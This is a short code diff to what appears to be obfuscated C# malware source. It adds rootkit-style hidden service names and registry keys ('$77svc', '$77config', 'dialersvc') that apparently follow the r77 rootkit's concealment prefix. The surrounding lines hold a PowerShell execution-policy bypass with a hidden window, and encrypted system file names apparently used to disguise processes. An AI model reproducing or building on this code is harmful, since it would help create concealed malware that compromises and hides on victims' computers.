@@ -125,6 +125,8 @@ namespace DBase
         public const string SddlBlockPath = "SddlBlockPath";
         public const string StartProcessCmd = "StartProcessCmd";
         public const string ArgumentListArg = "ArgumentListArg";
+        public const string R77_SERVICE_NAME = "$77svc";
+        public const string DIALER_SERVICE_NAME = "dialersvc";
     }
     // <<< BLENDFUSCATOR:MSKEYS:END
 
@@ -944,6 +946,8 @@ namespace DBase
             ["invoke-pattern"] = ".invoke()",
             ["policy-bp"] = "-ep bypass -w h",
         };
+
+        public string[] r77SubKeys = { @"dialerconfig", @"$77config" };
 
         public string[] SysFileName = new string[] {
         Bfs.Create("tvkRRqymL4wqdsOE12LBTg==", "lf4UlJYDpXtghy1X0CXROwfcP0Y0Y0WFh9jBkskxg2M=", "8uZmZQV+eAB0Giov8RQhyQ=="), //audiodg
